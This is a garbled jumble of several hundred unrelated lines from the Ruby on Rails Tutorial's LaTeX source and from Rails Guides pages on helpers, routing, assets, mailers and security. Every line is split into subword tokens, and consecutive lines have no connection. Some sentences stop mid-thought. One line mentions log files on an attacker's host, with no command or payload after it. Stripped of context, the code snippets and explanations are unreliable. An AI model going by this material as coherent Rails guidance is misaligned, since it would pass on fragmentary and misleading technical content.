▁As ▁\ href { http :// s ivers ▖ org } { D er e k ▁S ivers } ▁note s ▁in ▁the ▁for e word , ▁this ▁book ▁is ▁structure d ▁as ▁a ▁line ar ▁ n ar ra tive , ▁design ed ▁to ▁be ▁read ▁from ▁start ▁to ▁finish .
▁There ▁are ▁two ▁close ly ▁related ▁ subtle t ies ▁left ▁to ▁address .
▁The ▁result ing ▁\ k ode {" delete "} ▁links ▁will ▁be ▁displayed ▁only ▁if ▁the ▁current ▁user ▁is ▁an ▁admin ▁( Listing ~\ ref { code : delete _ links }) .
▁You ▁can ▁override ▁the ▁default ▁column ▁name ▁if ▁you ▁need ▁to :
▁"2010-07-27 "▖ to _ date ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010
▁The ▁general ▁subject ▁is ▁ deep , ▁but ▁for ▁the ▁purposes ▁of ▁this ▁tutorial ▁we ▁will ▁need ▁only ▁a ▁few ▁of ▁the ▁most ▁common ▁Unix ▁command - line ▁commands , ▁as ▁summariz ed ▁in ▁Table ~\ ref { table : uni x _ commands } .
▁create ▁app / assets / javascripts / welcome ▖ js ▖ coffee
▁Cucumber ▁features ▁are ▁ description s ▁of ▁expected ▁behavior ▁using ▁a ▁plain - text ▁language ▁called ▁\ href { https :// github ▖ com / cucumber / g her k in } { G her k in } .
▁These ▁are ▁exactly ▁the ▁sort s ▁of ▁ subtle t ies ▁that ▁benefit ▁from ▁test - driven ▁development , ▁so ▁we ' ll ▁write ▁tests ▁to ▁catch ▁the ▁two ▁errors ▁before ▁correct ing ▁them .
▁**` ActionDispatch :: Re load er ` **
▁As ▁noted ▁in ▁Section ~\ ref { sec : adding _ to _ the _ layout }, ▁many ▁of ▁these ▁classes ▁are ▁specific ▁to ▁\ href { http :// get bootstrap ▖ com /}{ Bootstrap }, ▁a ▁framework ▁from ▁Twitter ▁that ▁make s ▁it ▁easy ▁to ▁add ▁nice ▁web ▁design ▁and ▁user ▁interface ▁elements ▁to ▁an ▁HTML 5 ▁application .
▁ Adding ▁a ▁`` remember ▁me '' ▁checkbox ▁to ▁the ▁login ▁form .
▁now ▁= ▁ DateTime ▖ now ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 19 : 30 : 4 7 ▁- 0 400
▁ expire s ▁1 y ;
▁The ▁About ▁page ▁at ▁\ href { http ://0▖0▖0▖0:3000/ about }{/ about } .
▁Fix ing ▁this ▁blemish ▁requires ▁a ▁significant ly ▁more ▁complicated ▁regular ▁expression ▁and ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : modeling _ users _ exercises })▖)
▁Because ▁the ▁edit ▁form ▁is ▁modify ing ▁an ▁Active ▁Record ▁model ▁object ▁( i ▖ e ▖ , ▁a ▁user ), ▁we ▁can ▁rely ▁on ▁the ▁ shared ▁partial ▁from ▁Listing ~\ ref { code : password _ reset _ form } ▁to ▁render ▁error ▁messages .
▁It ▁also ▁depend s ▁on ▁how ▁difficult ▁the ▁test ▁is ▁relative ▁to ▁the ▁application ▁code , ▁how ▁precise ly ▁the ▁desired ▁features ▁are ▁known , ▁and ▁how ▁likely ▁the ▁feature ▁is ▁to ▁break ▁in ▁the ▁future .
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ show _ user _ rails _ 3- full ▖ png }{( full ▁size )}
▁The ▁example ▁used ▁before ▁was ▁a ▁controller ▁called ▁" projects ", ▁which ╼ generated ▁an ▁` app / assets / javascripts / projects ▖ js ▖ coffee ` ▁and ▁an ╼` app / assets / stylesheets / projects ▖ css ▖ scss ` ▁file .
▁To ▁insert ▁something ▁verb at im ▁use ▁the ▁` raw ` ▁helper ▁rather ▁than ▁calling ▁` html _ safe `:
▁Here ▁we ' ve ▁also ▁supplied ▁the ▁argument ▁\ k ode { password \_ digest : string } ▁with ▁the ▁name ▁and ▁type ▁of ▁attribute ▁we ▁want ▁to ▁create .
▁This ▁hierarchy ▁is ▁illustrate d ▁in ▁Figure ~\ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } .
▁There ▁is ▁no ▁default ▁error ▁message ▁for ▁` validates _ with ` ▖
▁In ▁order ▁to ▁make ▁the ▁necessary ▁User ▁model ▁object , ▁we ▁could ▁use ▁Active ▁Record ▁to ▁create ▁a ▁user ▁with ▁\ k ode { User ▖ create }, ▁but ▁experience ▁shows ▁that ▁user ▁\ emph { factor ies } ▁are ▁a ▁more ▁convenient ▁way ▁to ▁define ▁user ▁objects ▁and ▁insert ▁them ▁in ▁the ▁database .
▁As ▁we ' ll ▁see ▁in ▁Listing ~\ ref { code : relationships _ controller }, ▁enforc ing ▁access ▁control ▁on ▁the ▁Relationship s ▁controller ▁actions ▁won ' t ▁much ▁matter , ▁but ▁we ' ll ▁ still ▁follow ▁our ▁previous ▁practice ▁of ▁enforc ing ▁the ▁security ▁model ▁as ▁ early ▁as ▁possible .
▁\ href { http :// www ▖ got ealeaf ▖ com / railstutorial } { T ealeaf ▁A c a de my } : ▁A ▁good ▁online ▁Rails ▁development ▁b oo t c amp ▁( includes ▁advanced ▁material )
▁In ▁other ▁words , ▁the ▁construction
▁( The ▁first ▁line ▁here ▁is ▁just ▁to ▁make ▁sure ▁that ▁you ▁start ▁on ▁the ▁master ▁branch , ▁so ▁that ▁the ▁\ k ode { modeling - users } ▁topic ▁branch ▁is ▁base d ▁on ▁\ k ode { master } .
▁### ▁Choos ing ▁Be t we en ▁` belongs _ to ` ▁and ▁` has _ one `
▁render ▁ inline : ▁"< % ▁ products ▖ each ▁do ▁| p | ▁%>< p > <%= ▁p ▖ name ▁%></ p >< % ▁end ▁%> "
▁Because ▁the ▁application ▁code ▁was ▁already ▁working , ▁this ▁test ▁should ▁be ▁\ passing :
▁email _ field _ tag ▁' email '
▁This ▁hold s ▁true ▁even ▁when ▁you ' re ▁pull ing ▁in ▁a ▁partial ▁from ▁another ▁folder :
▁A ▁mockup ▁of ▁the ▁user ▁edit ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / edit _ user _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁Otherwise , ▁you ▁should ▁run ▁\ k ode { heroku ▁create } ▁and ▁then ▁\ k ode { git ▁push ▁ heroku ▁master } ▖)
▁U nfortunately , ▁it ' s ▁also ▁a ▁ cheat .
▁The ▁line
▁D ue ▁to ▁this , ▁it ▁make s ▁sense ▁to ▁just ▁have ▁your ╼ controller ▁tell ▁the ▁Mailer ▁to ▁send ▁an ▁email ▁when ▁a ▁user ▁is ▁successfully ▁created .
▁( We ' ll ▁put ▁this ▁improve d ▁helper ▁to ▁use ▁in ▁Section ~\ ref { sec : users _ index } ▖)
▁def ▁to _ check _ box _ tag ( options ▁= ▁ { }, ▁check ed _ value ▁= ▁ "1" , ▁un check ed _ value ▁= ▁" 0 ")
▁The ▁vertical ▁bar s ▁around ▁the ▁variable ▁name ▁in ~\ k ode { | i | } ▁are ▁Ruby ▁syntax ▁for ▁a ▁block ▁variable , ▁and ▁it ' s ▁up ▁to ▁the ▁method ▁to ▁know ▁what ▁to ▁do ▁with ▁the ▁block .
▁To ▁facilit ate ▁the ▁use ▁of ▁these ▁parameters , ▁it ' s ▁convention al ▁to ▁introduce ▁an ▁aux i li ary ▁method ▁called ▁\ k ode { user \_ params } ▁( which ▁returns ▁an ▁appropriate ▁initialization ▁hash ) ▁and ▁use ▁it ▁in ▁place ▁of ▁\ k ode { params [: user ]} :
▁assemblies ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁A ▁before ▁filter ▁restrict ing ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁If ▁you ▁use ▁a ▁hash - style ▁` where `, ▁then ▁record ▁creation ▁via ▁this ▁association ▁will ▁be ▁automatically ▁scope d ▁using ▁the ▁hash ▖
▁: format s => [: html ] , ▁: locale => [: en , ▁: en ]} ▖
▁In ▁this ▁chapter , ▁we ▁will ▁ begin ▁developing ▁the ▁sample ▁application ▁that ▁will ▁serve ▁as ▁our ▁example ▁throughout ▁the ▁rest ▁of ▁this ▁tutorial .
▁ assert _ recognizes ( { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' ▁ }, ▁' / photos /1 ')
▁# ▁=> ▁[[1, ▁' David '] , ▁[ 2, ▁' Jeremy '] , ▁[ 3 , ▁' J o se ' ]]
▁In ▁particular , ▁we ▁can ▁replace ▁the ▁code
▁* ▁` ActionDispatch :: Cookie s ` ▁set s ▁cookies ▁for ▁the ▁request .
▁Action ▁Mailer ▁allows ▁for ▁you ▁to ▁specify ▁a ▁` before _ action `, ▁` after _ action ` ▁and ╼` ar ound _ action ` .
▁Note ▁that , ▁for ▁ maximum ▁flexibility , ▁the ▁\ k ode { log \_ in \_ as } ▁method ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in } ▁accept s ▁an ▁\ k ode { options } ▁hash ▁( as ▁in ▁Listing ~\ ref { code : gravatar _ option }), ▁with ▁default ▁options ▁for ▁the ▁password ▁and ▁for ▁the ▁`` remember ▁me '' ▁checkbox ▁set ▁to ▁\ k ode { ' password ' } ▁and ▁\ k ode { ' 1 ' }, ▁respectively .
▁* ▁Rails ▁4▖0 ▁raise s ▁an ▁` ArgumentError ` ▁if ▁c la sh ing ▁named ▁routes ▁are ▁defined ▖
▁The ▁second ▁feature ▁of ▁the ▁asset ▁pipeline ▁is ▁asset ▁ mini f ic ation ▁or ▁compression ▖╼
▁When ▁click ed , ▁the ▁link ▁background ▁will ▁become ▁red ▖
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' pending '
▁ shallow ▁do
▁The ▁log ▁files ▁on ▁ www ▖ attacker ▖ com ▁will ▁read ▁like ▁this :
▁Ruby ▁is ▁a ▁big ▁language , ▁but ▁for t un ate ly ▁the ▁ subset ▁needed ▁to ▁be ▁ product ive ▁as ▁a ▁Rails ▁developer ▁is ▁relative ly ▁small .
▁Let ' s ▁see ▁for ▁example ▁the ▁definition ▁of ▁the ▁` cache s _ action ` ▁controller ▁ macro :
▁ dup ▁= ▁array ▖ deep _ dup
▁Client ▖ select (: id )▖ map ▁ { ▁| c | ▁c ▖ id ▁ }
▁Here ' s ▁the ▁problem : ▁what ╼ h app en s ▁when ▁we ▁have ▁lot s ▁of ▁JavaScript ▁we ▁want ▁to ▁execute ▁on ▁a ▁click ?
▁The ▁request ▁to ▁this ▁asset ▁is ▁then ▁served ▁by ▁the ▁Sprockets ▁gem .
▁For ▁completeness , ▁we ' ll ▁add ▁the ▁Contact ▁page , ▁which ▁was ▁left ▁as ▁an ▁exercise ▁in ▁Chapter ~\ ref { cha : static _ pages } .
▁% w ( a ▁b ▁c ▁d )▖ from (10) ▁# ▁=> ▁[]
▁Then ▁commit ▁the ▁other ▁changes ▁to ▁the ▁main ▁source ▁code ▁repository , ▁push ▁up ▁to ▁Bitbucket , ▁and ▁deploy ▁to ▁Heroku :
▁For ▁a ▁full ▁list ▁see ▁the ▁[ API ▁documentation ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers ▖ html )
▁For ▁example ▁here ▁we ▁get ▁the ▁correct ▁jump ▁in ▁the ▁c al end ar ▁re form :
▁### ▁ Flash ▁structure ▁changes
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { remember \_ token } ▁attribute .
▁For ▁each ▁of ▁the ▁select ed ▁users , ▁we ' ll ▁make ▁50 ▁microposts ▁( p l ent y ▁to ▁ overflow ▁the ▁pagination ▁ limit ▁of ~ 30 ) .
▁ Previous ▁ edition s ▁of ▁this ▁book ▁used ▁GitHub ▁because ▁of ▁its ▁emphasi s ▁on ▁support ing ▁open - source ▁code , ▁but ▁g row ing ▁concern s ▁about ▁security ▁have ▁ le d ▁me ▁to ▁recommend ▁that ▁\ emph { all } ▁web ▁application ▁repositories ▁be ▁ private ▁by ▁default .
▁< h 1> Product s </ h 1>
▁This ▁is ▁exactly ▁the ▁kind ▁of ▁situation ▁where ▁I ▁like ▁to ▁write ▁some ▁tests ▁first .
▁table _ name ▁= ▁class _ name ▖ to _ s ▖ demodulize ▖ underscore
▁### ▁ Updating ▁the ▁C HA N G E LO G
▁En v ir on ment al ▁ Security
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁toy ▁app .
▁1234567890 123 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 12 ▁T B
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / k ernel / singleton _ class ▖ rb ` .
▁Even ▁a ▁single ▁test ▁requires ▁the ▁same ▁Rails ▁environment ▁over head , ▁of ▁course , ▁which ▁is ▁why ▁these ▁commands ▁are ▁ perfect ly ▁complement ed ▁by ▁Spork : ▁running ▁a ▁single ▁test ▁eliminate s ▁the ▁over head ▁of ▁running ▁the ▁entire ▁test ▁file , ▁while ▁running ▁Spork ▁eliminate s ▁the ▁over head ▁of ▁starting ▁the ▁test ▁environment .
▁text _ field _ tag ▁' name '
▁Verify ▁that ▁you ▁have ▁a ╼ current ▁version ▁of ▁Ruby ▁installed :
▁The ▁computer ▁doesn ' t ▁care ▁what ▁the ▁code ▁look s ▁like , ▁of ▁course , ▁but ▁ human s ▁do , ▁so ▁it ▁is ▁important ▁to ▁keep ▁the ▁code ▁base ▁clean ▁by ▁refactoring ▁f r equ ent ly .
▁# ▁=> ▁Fri , ▁ 15 ▁Oct ▁ 1582
▁create ▁db / migrate / [ timestamp ] _ create _ blorgh _ comments ▖ rb
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" password " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁module ▁ Class Methods
▁The ▁way ▁to ▁create ▁a ▁file ▁var ies ▁by ▁system ▁setup , ▁but ▁most ▁text ▁editor s ▁will ▁let ▁you ▁control - click ▁inside ▁the ▁directory ▁where ▁you ▁want ▁to ▁create ▁the ▁file ▁to ▁br ing ▁up ▁a ▁ menu ▁with ▁a ▁`` New ▁File '' ▁ menu ▁item .
▁╼╼ ▁\ subsection { A ▁toy ▁model ▁for ▁users } ▁% ▁( fold )╼ ▁\ label { sec : modeling _ demo _ users }╼╼
▁number _ to _ human _ size ( 123 4 ) ▁# ▁=> ▁1▖ 2 ▁ K B
▁This ▁correspond s ▁to ▁\ text tt { HTTP \_ RE F ER ER }, ▁as ▁defined ▁by ▁the ▁specific ation ▁for ▁HTTP ▖ ▁Note ▁that ▁`` referer '' ▁is ▁not ▁a ▁t y po --- the ▁word ▁is ▁actually ▁ mis s pe ll ed ▁in ▁the ▁ spec .
▁This ▁method ▁may ▁be ▁useful ▁for ▁example ▁to ▁easily ▁accept ▁both ▁symbols ▁and ▁strings ▁as ▁options ▖
▁ assert _ recognizes ( { ▁controller : ▁' photos ', ▁action : ▁' create ' ▁ }, ▁ { ▁path : ▁' photos ', ▁method : ▁: post ▁ })
▁In ▁addition , ▁when ▁testing ▁for ▁user ▁ listing s ▁it ▁would ▁be ▁convenient ▁for ▁them ▁all ▁to ▁have ▁different ▁names .
▁This ▁ limit ▁defaults ▁to ▁5 ▁and ▁can ▁be ▁configured ▁in ▁` database ▖ yml ` .
▁ Account ▁activation ▁is ▁now ▁complete d , ▁which ▁is ▁a ▁mil est one ▁worth y ▁of ▁a ▁commit :
▁def ▁index
▁Signup ▁failure ▁debug ▁information ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ failure _ rails _ 4 _ debug - full ▖ png }{( full ▁size )}
▁Create ▁a ▁micropost ▁( exception ▁on ▁failure ) .
▁As ▁we ▁will ▁see , ▁there ▁is ▁a ▁problem ▁with ▁this ▁approach , ▁and ▁we ' ll ▁learn ▁how ▁to ▁fix ▁it ▁using ▁\ k ode { has \_ many ▁through } .
▁The ▁complete ▁implementation ▁for ▁secure ▁passwords ▖
▁Note ▁that ▁ none ▁of ▁the ▁methods ▁above ▁changes ▁\ k ode { a } ▁itself .
▁created _ at : ▁"2013-03- 12 ▁ 05 : 51 : 34 ", ▁updated _ at : ▁"2013-03- 12 ▁ 05 : 51 : 34 ",
▁@ article ▁= ▁Article ▖ new ( params ▖ require (: article )▖ permit (: title , ▁: text ) )
▁The ▁syntax ▁m ight ▁look ▁a ▁little ▁ st range , ▁but ▁its ▁effect ▁is ▁similar ▁to ▁variable ▁assignment .
▁as ▁show n ▁in ▁Listing ~\ ref { code : protected _ index _ test } .
▁If ▁you ▁did ▁not ▁configure ▁the ▁`: host ` ▁option ▁ global ly ▁make ▁sure ▁to ▁pass ▁it ▁to ╼` url _ for ` .
▁Rendering ▁not h ing ▁can ▁be ▁useful ▁for ▁Ajax ▁requests ▁where ▁all ▁you ▁want ▁to ▁send ▁back ▁to ▁the ▁browser ▁is ▁an ▁a c knowledg ment ▁that ▁the ▁request ▁was ▁complete d .
▁Then ▁we ' ll ▁make ▁a ▁ listing ▁of ▁all ▁users ▁( also ▁ requiring ▁ authorization ), ▁which ▁will ▁m o t i v ate ▁the ▁introduction ▁of ▁sample ▁data ▁and ▁pagination .
▁See ▁[ Asset ╼ O r g an i z ation ](# asset - org an i z ation ) ▁above ▁for ▁ guid ance ▁on ▁the ▁correct ▁location s ╼ for ▁different ▁file ▁types .
▁If ▁you ▁need ▁to ▁use ▁` return ` ▁statement s ▁in ▁your ▁callbacks , ▁it ▁is ▁recommended ▁that ▁you ▁explicitly ▁define ▁them ▁as ▁methods .
▁ Experience ▁shows ▁that ▁even ▁fai r ly ▁simple ▁refactoring ▁is ▁error - prone ▁and ▁can ▁easily ▁go ▁a w ry .
▁ Follow ing ▁the ▁template ▁in ▁Listing ~\ ref { code : image _ upload _ test }, ▁write ▁a ▁test ▁of ▁the ▁image ▁ uploader ▁in ▁Section ~\ ref { sec : micropost _ images } .
▁WARNING : ▁Note ▁that ▁number s ▁are ▁not ▁mentioned ▖
▁This ▁make s ▁them ▁idea l ▁for ▁use ▁as ▁hash ▁keys .
▁In ▁all ▁of ▁these ▁cases , ▁if ▁you ▁don ' t ▁provide ▁the ▁leading ▁host ▁( ` http :// www ▖ example ▖ com ` ), ▁Rails ▁will ▁take ▁those ▁details ▁from ▁the ▁current ▁request .
▁The ▁syntax ▁for ▁this ▁introduce s ╼` require ` ▁and ▁` permit ` ▖
▁ Technical ly , ▁only ▁the ▁domain ▁part ▁of ▁the ▁email ▁address ▁is ▁case - insensitive : ▁\ emph { foo @ bar ▖ com } ▁is ▁actually ▁different ▁from ▁\ emph { Foo @ bar ▖ com } .
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ id ▁= ▁10 ) ▁LIMIT ▁1
▁You ▁can ▁find ▁ additional ▁resources ▁about ▁( Rails ) ▁security ▁here :
▁class ▁E mail Validator ▁< ▁ ActiveModel :: Each Validator
▁d ▖ next _ month ▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010
▁A ▁test ▁for ▁the ▁Contact ▁page ▖
▁This ▁hash ▁get s ▁passed ▁to ▁the ▁Users ▁controller ▁as ▁part ▁of ▁\ k ode { params }, ▁and ▁we ▁saw ▁starting ▁in ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁the ▁\ k ode { params } ▁hash ▁contains ▁information ▁about ▁each ▁request ▖ ▁In ▁the ▁case ▁of ▁a ▁URL ▁like ▁ / users /1 , ▁the ▁value ▁of ▁\ k ode { params [: id ]} ▁is ▁the ▁\ k ode { id } ▁of ▁the ▁corresponding ▁user ▁(\ k ode {1} ~ in ▁this ▁example ) .
▁It ' s ▁best ▁not ▁to ▁rely ▁on ▁that , ▁though , ▁so ▁we ' ve ▁taken ▁the ▁extra ▁step ▁and ▁added ▁an ▁extra ▁layer ▁of ▁security .
▁create _ table ▁: patients ▁do ▁| t |
▁If ▁all ▁we nt ▁well , ▁you ▁should ▁run ▁the ▁full ▁test ▁suite ▁to ▁verify ▁that ▁all ▁the ▁tests ▁are ▁\ passing :
▁When ▁writing ▁applications ▁using ▁other ▁programming ▁languages ▁or ▁framework s , ▁it ╼ ma y ▁be ▁necessary ▁to ▁write ▁a ▁lot ▁of ▁configuration ▁code ▖
▁But ▁JavaScript ▁has ▁a ▁hand y ▁ eval () ▁function ▁which ▁execute s ▁any ▁string ▁as ▁code .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ following _ test } .
▁### ▁ Local ▁P re com p i l ation
▁We ▁start ▁with ▁the ▁page ▁to ▁show ▁all ▁the ▁users ▁in ▁our ▁application , ▁called ▁\ href { http ://0▖0▖0▖0:3000/ users }{\ text tt { index } } ; ▁as ▁you ▁m ight ▁expect , ▁initially ▁there ▁are ▁no ▁users ▁at ▁all ▁( Figure ~\ ref { fig : demo _ blank _ user _ index _ rails _3} ) .
▁Extensions ▁to ▁` DateTime `
▁# ▁becomes
▁#### # ▁` group `
▁def ▁some _ class _ method
▁ ╼╼% ▁subsection ▁user _ index _ test ▁( end )╼╼ ▁\ subsection { Partial ▁refactoring } ▁% ▁( fold )╼ ▁\ label { sec : partial _ refactoring }╼╼
▁Re f er r ing ▁to ▁the ▁data ▁model ▁in ▁Figure ~\ ref { fig : user _ model _ password _ digest }, ▁we ▁see ▁that ▁this ▁means ▁creating ▁a ▁\ k ode { password \_ digest } ▁attribute ▁for ▁the ▁user ▁fixture , ▁which ▁we ' ll ▁accomplish ▁by ▁defin ing ▁a ▁\ k ode { digest } ▁method ▁of ▁our ▁own .
▁#### ▁ Template ▁ Caching
▁In ▁particular , ▁the ▁code ▁above ▁check s ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { < title > } ▁tag ▁containing ▁the ▁string ▁`` Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' .
▁Testing ▁the ▁order ▁of ▁a ▁user ' s ▁microposts .
▁( A ▁second ▁option ▁is ▁to ▁use ▁\ k ode { form \_ tag } ▁in ▁place ▁of ▁\ k ode { form \_ for } ; ▁this ▁m ight ▁be ▁even ▁more ▁ idiomatic ally ▁correct ▁Rails , ▁but ▁it ▁has ▁less ▁in ▁common ▁with ▁the ▁signup ▁form , ▁and ▁at ▁this ▁stage ▁I ▁want ▁to ▁emphasize ▁the ▁parallel ▁structure .
▁It ▁is ▁also ▁worth ▁noting ▁that ▁old er ▁branch es ▁m ight ▁have ▁a ▁different ▁set ▁of ▁build ▁ target s ▁than ▁master ▖
▁What ▁is ▁Rails ?
▁We ▁do ▁this ▁because ▁Rails ▁will ▁pass ▁all ▁instance ╼ variable s ▁to ▁the ▁view .
▁* ▁Add s ▁support ▁for ▁" Conditional ▁` GET ` " ▁so ▁that ▁server ▁respond s ▁with ▁not h ing ▁if ▁page ▁was n ' t ▁changed .
▁However , ▁note ▁that ▁you ▁don ' t ▁need ▁to ▁use ▁an ch or s ▁because ▁all ▁routes ▁are ▁an ch or ed ▁at ▁the ▁start .
▁root ▁' welcome # index '
▁This ▁would ▁be ▁useful , ▁for ▁example , ▁if ▁you ▁want ed ▁to ▁re sum e ▁an ▁inter r up ted ▁ batch ▁process , ▁provided ▁you ▁saved ▁the ▁last ▁processed ▁ ID ▁as ▁a ▁check point .
▁This ▁section ▁cover s ▁how ▁to ╼ m o un t ▁the ▁engine ▁into ▁an ▁application ▁and ▁the ▁initial ▁setup ▁required , ▁as ▁well ▁as ╼ link ing ▁the ▁engine ▁to ▁a ▁` User ` ▁class ▁provided ▁by ▁the ▁application ▁to ▁provide ╼ owner ship ▁for ▁articles ▁and ▁comments ▁within ▁the ▁engine .
▁You ▁can ▁also ▁tell ▁Rails ▁to ▁render ▁with ▁no ▁layout ▁at ▁all :
▁When ▁a ▁new ▁micropost ▁is ▁made ▁in ▁this ▁way , ▁its ▁\ k ode { user \_ id } ▁is ▁automatically ▁set ▁to ▁the ▁right ▁value .
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e "]
▁t ▖ string ▁: name
▁as ▁show n ▁in ▁Listing ~\ ref { code : about _ route } .
▁### ▁ Partial s
▁You ▁can ▁override ▁this ▁view ▁in ▁the ▁application ▁by ▁simply ▁creating ▁a ▁new ▁file ▁at ╼` app / views / blorgh / articles / index ▖ html ▖ erb ` ▖
▁This ▁object ▁must ▁have ▁a ▁` compress ` ▁method ▁that ▁take s ▁a ▁string ▁as ▁the ▁so le ╼ argument ▁and ▁it ▁must ▁return ▁a ▁string .
▁### ▁N um b er Helper
▁* ▁D own case s ▁all ▁words ▁except ▁ acronym s .
▁TIP : ▁If ▁you ▁want ▁to ▁see ▁the ▁exact ▁results ▁of ▁a ▁call ▁to ▁` render ` ▁without ▁need ing ▁to ▁ inspect ▁it ▁in ▁a ▁browser , ▁you ▁can ▁call ▁` render _ to _ string ` ▖
▁See ▁[ this ▁pull ▁request ]( https :// github ▖ com / rails / rails / pull /1 3 27 1 ) ▁for ▁more ╼ de tail s .
▁This ▁does ▁not h ing ▁but ▁def er ▁the ▁real ▁work ▁to ▁\ k ode { follow } ▁and ▁\ k ode { unfollow } ▁partials , ▁which ▁need ▁new ▁routes ▁for ▁the ▁Relationship s ▁resource , ▁which ▁follows ▁the ▁Microposts ▁resource ▁example ▁( Listing ~\ ref { code : microposts _ resource }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : relationships _ resource } .
▁date ▖ since (1) ▁# ▁=> ▁Fri , ▁ 11 ▁Jun ▁2010 ▁ 00 :00 : 0 1 ▁E D T ▁- 04 :00
▁route ▁get ▁" static _ pages / home "
▁### ▁The ▁Active ▁Record ▁ Pattern
▁Here ' s ▁what :
▁These ▁ label s ▁then ▁allow ▁us ▁to ▁style ▁the ▁error ▁messages ▁with ▁the ▁ SCSS ▁show n ▁in ▁Listing ~\ ref { code : error _ messages _ css }, ▁which ▁make s ▁use ▁of ▁Sass ' s ▁\ k ode {@ ext end } ▁function ▁to ▁include ▁the ▁functionality ▁of ▁the ▁Bootstrap ▁class ▁\ k ode { has - error } .
▁prepar ed _ state ment s : ▁false
▁The ▁goal ▁of ▁this ▁section ▁is ▁to ▁start ▁changing ▁this ▁ s ad ▁state ▁of ▁a f fa ir s ▁by ▁pro d u c ing ▁the ▁signup ▁form ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : signup _ mockup } .
▁# ▁Generate s ▁a ▁time ▁select ▁that ▁defaults ▁to ▁the ▁time ▁provided
▁which ▁in ▁Ruby ▁1▖ 8 ▁returns ▁` [ nil ]` ▁for ▁` nil `, ▁and ▁calls ▁to ▁` Array ( object ) ` ▁otherwise ▖
▁ / logout
▁In ▁this ▁case , ▁the ▁partial ▁will ▁have ▁access ▁to ▁a ▁local ▁variable ▁` title ` ▁with ▁the ▁value ▁" Product s ▁P age " .
▁create ▁test / fixtures / users ▖ yml
▁* ▁` ActiveRecord :: Connection Adapters :: Connection Management ` ▁clean s ▁active ▁connection s ▁after ▁each ▁request , ▁unless ▁the ▁` rack ▖ test ` ▁key ▁in ▁the ▁request ▁environment ▁is ▁set ▁to ▁` true ` .
▁We ▁tell ▁Rails ▁which ▁process or ▁to ▁use ▁using ▁filename ▁extensions ; ▁the ▁three ▁most ▁common ▁cases ▁are ▁\ k ode { ▖ scss } ▁for ▁Sass , ▁\ k ode { ▖ coffee } ▁for ▁CoffeeScript , ▁and ▁\ k ode { ▖ erb } ▁for ▁ embedded ▁Ruby ▁( ERb ) .
▁To ▁fix ▁this , ▁I ▁a m ▁current ly ▁working ▁with ▁N ic ▁and ▁Way ne ▁to ▁create ▁a ▁list ▁of ▁Rails ▁In st all ers ▁order ed ▁by ▁Rails ▁version ▁number .
▁### ▁` load `
▁( Proc s ▁are ▁a ▁some what ▁advanced ▁Ruby ▁topic , ▁so ▁don ' t ▁worry ▁if ▁they ▁don ' t ▁make ▁sense ▁right ▁a way ▖)
▁You ▁actually ▁have ▁a ▁functional ▁Rails ▁application ▁already ▖
▁The ▁`: association _ foreign _ key ` ▁option ▁let s ▁you ▁set ▁the ▁name ▁of ▁the ▁foreign ▁key ▁directly :
▁< link ▁ href ="/ assets / application - 4 d d 5 b 10 9 e e 34 3 9 d a 5 4 f 5 b d fd 78 a 80 4 7 3 ▖ css " ▁ media =" screen " ╼ rel =" stylesheet " ▁/>
▁while
▁ ╼ ▁=> ▁" production "
▁### ▁` Rails :: Railtie # initializer `
▁When ▁it ▁cannot ▁get ▁connection , ▁a ▁time out ╼ error ▁similar ▁to ▁given ▁below ▁will ▁be ▁throw n .
▁We ▁can ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : relationships _ access _ control } ▁to ▁pass ▁by ▁adding ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter ▁( Listing ~\ ref { code : relationships _ controller }) .
▁Of ▁course , ▁you ▁need ▁to ▁have ▁right s ╼ to ▁the ▁view ▁that ▁you ' re ▁using ▁to ▁render ▁the ▁content .
▁# ▁environment
▁ Account ▁activation ▁via ▁the ▁user ▁model ▁object .
▁The ▁`: controller ` ▁option ▁let s ▁you ▁explicitly ▁specify ▁a ▁controller ▁to ▁use ▁for ▁the ▁resource ▖
▁Implement ing ▁the ▁active ▁relationships ▁\ k ode { has \_ many } ▁association .
▁To ▁see ▁the ▁result , ▁start ▁a ▁Rails ▁development ▁server ▁as ▁describe d ▁in ▁Section ~\ ref { sec : rails _ server } :
▁Rails ▁comes ▁with ▁built - in ▁function s ▁for ▁defin ing ▁associations ▁between ▁different ▁data ▁models .
▁ ting ▁tests ▁are ▁\ failing ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 d 59 d ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁partial _ refactoring ▁( end )╼╼ ▁% ▁section ▁ showing _ users ▁( end )╼╼ ▁\ section { D e let ing ▁users } ▁% ▁( fold )╼ ▁\ label { sec : deleting _ users }╼╼
